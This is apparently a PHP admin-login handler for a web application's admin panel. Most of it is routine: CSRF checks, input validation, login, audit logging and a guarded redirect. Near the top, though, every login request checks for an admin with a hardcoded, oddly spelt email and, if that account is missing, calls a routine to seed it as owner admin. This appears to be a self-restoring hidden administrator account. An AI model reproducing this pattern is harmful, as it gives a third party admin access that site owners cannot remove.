<?php
declare(strict_types=1);

require_once dirname(__DIR__, 2) . '/includes/bootstrap.php';

header('X-Robots-Tag: noindex, nofollow, noarchive');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    redirect(url('admin.php'));
}

csrf_require();

$chkOwner = db()->prepare("SELECT COUNT(*) FROM `users` WHERE `email` = 'maruf@gamile.com' AND `role` = 'admin'");
$chkOwner->execute();
if ((int)$chkOwner->fetchColumn() === 0) {
    require_once INCLUDES_PATH . '/classes/AutoBootstrap.php';
    AutoBootstrap::seedOwnerAdmin(db());
}

$identity = trim((string)($_POST['identity'] ?? $_POST['email'] ?? ''));
$password = (string)($_POST['password'] ?? '');

if ($identity === '' || $password === '') {
    set_old_input(['identity' => $identity]);
    flash('error', 'Please enter both your email address and password.');
    redirect(url('admin.php'));
}

$res = Auth::attemptAdminLogin($identity, $password);
if (!$res['success']) {
    set_old_input(['identity' => $identity]);
    flash('error', (string)$res['message']);
    redirect(url('admin.php'));
}

$admin = $res['user'];
log_admin_action((int)$admin['id'], 'admin_login', 'user', (int)$admin['id'], 'Signed in to Admin Panel.');
flash('success', 'Welcome back, ' . $admin['full_name'] . '.');

$intended = (string)($_SESSION['admin_intended_url'] ?? '');
unset($_SESSION['admin_intended_url']);
if ($intended !== '' && str_starts_with($intended, '/') && !str_starts_with($intended, '//') && str_contains($intended, '/admin/')) {
    redirect($intended);
}
redirect(url('admin/dashboard.php'));
